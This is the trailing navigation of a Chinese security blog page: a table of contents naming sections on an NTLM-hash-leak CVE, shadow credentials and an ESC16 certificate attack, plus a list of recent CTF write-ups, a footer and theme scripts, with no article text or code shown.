fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2025-24071%E6%98%AF%E9%80%9A%E8%BF%87-RAR-ZIP-%E6%8F%90%E5%8F%96%E5%92%8C-library-ms-%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-NTLM-%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">2.</span> <span class="toc-text">cve-2025-24071是通过 RAR&#x2F;ZIP 提取和 .library-ms 文件泄露 NTLM 哈希值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E8%AF%81%E4%B9%A6%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">影子证书攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CA-%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB-ESC16"><span class="toc-number">4.</span> <span class="toc-text">CA 证书模板漏洞攻击 - ESC16</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/26/hkcertctf-wp/" title="hkcertctf-wp">hkcertctf-wp</a><time datetime="2025-12-26T14:25:30.000Z" title="发表于 2025-12-26 22:25:30">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/10/2025%E9%99%87%E5%89%91%E6%9D%AFFinal-wp/" title="2025陇剑杯Final-wp">2025陇剑杯Final-wp</a><time datetime="2025-12-10T13:40:03.000Z" title="发表于 2025-12-10 21:40:03">2025-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/10/hackmyvm-multi/" title="hackmyvm_multi">hackmyvm_multi</a><time datetime="2025-12-10T13:39:00.000Z" title="发表于 2025-12-10 21:39:00">2025-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/28/hackmyvm-zero/" title="hackmyvm-zero">hackmyvm-zero</a><time datetime="2025-07-28T09:07:40.000Z" title="发表于 2025-07-28 17:07:40">2025-07-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/28/htb-season8-2-fluffy/" title="htb-season8.2-fluffy">htb-season8.2-fluffy</a><time datetime="2025-07-28T08:32:46.000Z" title="发表于 2025-07-28 16:32:46">2025-07-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By dgh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>